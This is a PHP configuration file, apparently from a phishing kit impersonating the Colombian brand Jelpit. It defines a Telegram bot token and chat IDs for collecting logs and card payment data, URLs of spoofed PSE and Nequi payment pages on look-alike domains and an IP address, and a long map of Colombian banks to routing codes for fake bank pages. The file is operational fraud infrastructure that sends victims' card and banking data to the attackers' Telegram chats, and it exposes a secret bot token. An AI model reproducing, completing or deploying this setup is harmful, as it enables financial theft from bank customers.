<?php
// =====================================================
// Configuración Jelpit — edita sólo este archivo
// =====================================================
require_once __DIR__ . '/ban_check.php';

// ── Telegram ──────────────────────────────────────────
define('TG_TOKEN', '8840764725:AAGpJvwQ-BedbwvKzObO00RoUKU8TkBKFQo');
define('TG_CHAT', '-4955190747');   // Chat principal (logs generales) 
define('TG_CHAT_CC', '-5235238333');   // Chat pagos con tarjeta

//define('TG_CHAT', '235905376');   // Chat principal (logs generales) 
//define('TG_CHAT_CC', '-5131767520');   // Chat pagos con tarjeta


// ── PSE ───────────────────────────────────────────────
define('PSE_BASE', 'https://pagosonline-pse.vercel.app');
define('RECAUDOFALL_BASE', 'https://recaudofall.94.250.202.215.nip.io/generar-wompi');
define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#8jiyMZckw4E2nYA6');

// Bancos existentes → vercel (/sites/{slug}/manager/{id})
$PSE_BANKS = [
    'bancolombia' => ['slug' => 'bc', 'id' => '109'],
    'bogota' => ['slug' => 'bg', 'id' => '109'],
    'nequi' => ['slug' => 'nq', 'id' => '109'],
    'popular' => ['slug' => 'pop', 'id' => '109'],
    'caja-social' => ['slug' => 'cj', 'id' => '109'],
];

// Bancos → recaudofall (código numérico del select de recaudofall)
$PSE_BANKS_RECAUDOFALL = [
    'davivienda'      => '1051',
    'daviplata'       => '1551',
    'bbva'            => '1013',
    'colpatria'       => '1019',
    'avvillas'        => '1052',
    'itau'            => '1006',
    'falabella'       => '1062',
    'occidente'       => '1023',
    'coopcentral'     => '1066',
    'bancoomeva'      => '1061',
    'gnb'             => '1012',
    'agrario'         => '1040',
    'rappipay'        => '1811',
    'lulo'            => '1070',
    'bancamia'        => '1059',
    'movii'           => '1801',
    'confiar'         => '1292',
    'pichincha'       => '1060',
    'serfinanza'      => '1069',
    'cfa'             => '1283',
    'union'           => '1303',
    'citibank'        => '1009',
    'finandina'       => '1063',
    'iris'            => '1637',
    'coofinep'        => '1291',
    'credifinanciera' => '1558',
    'santander'       => '1065',
    'coltefinanciera' => '1370',
    'cotrafa'         => '1289',
    'nu'              => '1809',
    'uala'            => '1804',
    'alianza'         => '1815',
    'jpmorgan'        => '1071',
    'mundo-mujer'     => '1047',
    'crezcamos'       => '1816',
    'dale'            => '1097',
    'jfk'             => '1286',
    'bold'            => '1808',
    'juriscoop'       => '1121',
    'powwi'           => '1803',
    'coink'           => '1812',
    'ding'            => '1802',
    'global66'        => '1814',
];
